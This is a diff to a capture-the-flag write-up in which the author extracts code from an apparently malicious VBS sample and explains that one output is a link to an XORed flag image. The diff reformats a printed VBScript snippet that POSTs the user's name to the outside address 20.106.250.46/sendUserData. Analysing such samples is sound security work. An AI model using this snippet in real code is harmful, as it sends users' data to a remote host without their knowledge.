@@ -19,9 +19,13 @@ I picked out all the strange code and placed it in my own vbs file to run.
 
 The output is as follows:
 `c:\temp\defcon-flag.png.compromised `
-``` https://download1647.mediafire.com/l188u2d532qg3fOoLpilcI89p0_h4E0cGLjk_uvBUiag7E_rMZ-H5-me9Kr9SQLVQaKSiKcEvJO-EkfTSUqWlrN6SzXgI0LYBh-F5em4IA4iX3tOIGh0Ej46GlwvLOfT8pzvuy91Utej1r2I0jg7YsUNcssPted508dskWRpkAI/yea535hvgp32vmv/defcon-flag.png.XORed```
+```
+https://download1647.mediafire.com/l188u2d532qg3fOoLpilcI89p0_h4E0cGLjk_uvBUiag7E_rMZ-H5-me9Kr9SQLVQaKSiKcEvJO-EkfTSUqWlrN6SzXgI0LYBh-F5em4IA4iX3tOIGh0Ej46GlwvLOfT8pzvuy91Utej1r2I0jg7YsUNcssPted508dskWRpkAI/yea535hvgp32vmv/defcon-flag.png.XORed
+```
 
-```Dim http: Set http = CreateObject("WinHttp.WinHttpRequest.5.1")                Dim url: url = "http://20.106.250.46/sendUserData"                              With http                                                                          Call .Open("POST", url, False)                                                  Call .SetRequestHeader("Content-Type", "application/json")                      Call .Send("{""username"":""" & strUser & """}")                             End With                                                                        res = Msgbox("Thank you for your cooperation!", vbOKOnly+vbInformation, "")```
+```
+Dim http: Set http = CreateObject("WinHttp.WinHttpRequest.5.1")                Dim url: url = "http://20.106.250.46/sendUserData"                              With http                                                                          Call .Open("POST", url, False)                                                  Call .SetRequestHeader("Content-Type", "application/json")                      Call .Send("{""username"":""" & strUser & """}")                             End With                                                                        res = Msgbox("Thank you for your cooperation!", vbOKOnly+vbInformation, "")
+```
 
 The second one is a link to download a file named `defcon-flag.png.XORed` which, from the name, we can assume is our flag as an image that has been XORed. So now we just need to the key to XOR it back with. 
 
